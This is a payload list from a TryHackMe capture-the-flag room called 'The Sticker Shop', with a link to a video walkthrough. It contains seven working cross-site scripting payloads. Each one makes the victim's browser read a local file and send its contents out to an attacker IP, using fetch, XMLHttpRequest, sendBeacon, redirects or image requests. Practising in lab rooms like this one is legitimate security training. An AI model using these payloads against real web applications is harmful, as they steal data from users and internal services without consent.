Payload used on TryHackMe room The Sticker Shop https://tryhackme.com/r/room/thestickershop
video walk through: https://youtu.be/lB68TvzPEHI

<script><br />
fetch('http://127.0.0.1:8080/flag.txt')<br />
  .then(response => response.text())<br />
  .then(data => {<br />
    fetch('http://10.10.36.125:8015', { <br />
      method: 'POST',<br />
      body: data<br />
    });<br />
  });<br />
</script><br />

==<br />
<script><br />
var xhr = new XMLHttpRequest();<br />
xhr.open('GET', 'http://127.0.0.1:8080/flag.txt', true);<br />
xhr.onload = function() {<br />
    fetch('http://10.10.36.125:8015', {<br />
        method: 'POST',<br />
        body: xhr.responseText<br />
    });<br />
};<br />
xhr.send();<br />
</script><br />
<br />
==<br />
<br />
<script><br />
fetch('http://127.0.0.1:8080/flag.txt')<br />
  .then(response => response.text())<br />
  .then(data => {<br />
    navigator.sendBeacon('http://10.10.36.125:8015', data);<br />
  });<br />
</script><br />
<br />
===<br />
<br />
<script><br />
(async () => {<br />
  try {<br />
    const response = await fetch('http://127.0.0.1:8080/flag.txt');<br />
    const data = await response.text();<br />
    await fetch('http://10.10.36.125:8015', {<br />
      method: 'POST',<br />
      headers: { 'Content-Type': 'text/plain' },<br />
      body: data<br />
    });<br />
  } catch (error) {<br />
    // Optional error handling<br />
  }<br />
})();<br />
</script><br />
<br />
== get<br />
<script><br />
fetch('http://127.0.0.1:8080/flag.txt')<br />
  .then(response => response.text())<br />
  .then(data => {<br />
    window.location = `http://10.10.36.125:8015?flag=${encodeURIComponent(data)}`;<br />
  });<br />
</script><br />
<br />
<br />
base64:<br />
<br />
<script><br />
fetch('http://127.0.0.1:8080/flag.txt')<br />
  .then(response => response.text())<br />
  .then(data => {<br />
    window.open(`http://10.10.36.125:8015?flag=${btoa(data)}`, '_blank');<br />
  });<br />
</script><br />
<br />
===<br />
<script><br />
fetch('http://127.0.0.1:8080/flag.txt')<br />
  .then(response => response.text())<br />
  .then(data => {<br />
    var img = new Image();<br />
    img.src = `http://10.10.36.125:8015/?flag=${encodeURIComponent(data)}`;<br />
  });<br />
</script><br />
<br />
===<br />
